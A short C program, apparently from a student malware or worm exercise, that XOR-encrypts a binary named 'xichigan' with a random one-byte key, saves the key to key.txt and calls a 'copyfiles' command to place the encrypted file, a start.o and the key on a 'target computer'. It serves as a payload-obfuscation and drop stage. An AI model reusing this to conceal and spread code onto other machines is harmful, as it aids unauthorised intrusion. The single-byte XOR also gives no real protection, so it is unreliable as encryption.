#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h> 

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* Compile: gcc -o encrypt encrypt.c						 					 					*
*																				 							*
* Program to encrypt Xichigan.o and leave the key in key.txt			            *
**********************************************************************************/

int main(int argc, char*argv[]) {
	FILE *xFp;
	FILE *keyFp;
	char ch;
	int key;

	/* 
		Get a key to encrypt the file with (8 bit key) = 1-255 DEC
	*/
	srand(time(NULL));
	key = rand() % 255 + 1; 

	/* 
		Write the new key as an int to key.txt to use when encrypting later
	*/
	keyFp = fopen("key.txt","w");
	fprintf (keyFp, "%d", key); 
	fclose(keyFp);

	/* 
		Encrypt the file Xichigan.o using the key by performing a bitwise XOR
	*/

	// Open the file xichigan (.o file) to encrypt
	xFp = fopen("xichigan","rb+");
	if (xFp == NULL){
		//printf("Cannot open file \n");
		return(0); // Exit with no error to target
	}

	// Read in the file 1 character at a time and replace with the value changed by key
	while ((ch = fgetc(xFp)) != EOF){
		fseek(xFp, ftell(xFp) - 1, SEEK_SET);
		fprintf(xFp, "%c", ch ^ key); // Bitwise xor
	}

	fclose(xFp);

	/* 
		Start copyfiles to put the newly encrypted xichigan file plus start.o and key.txt on the target computer
	*/
	system ("copyfiles");
	
	return 0;

}
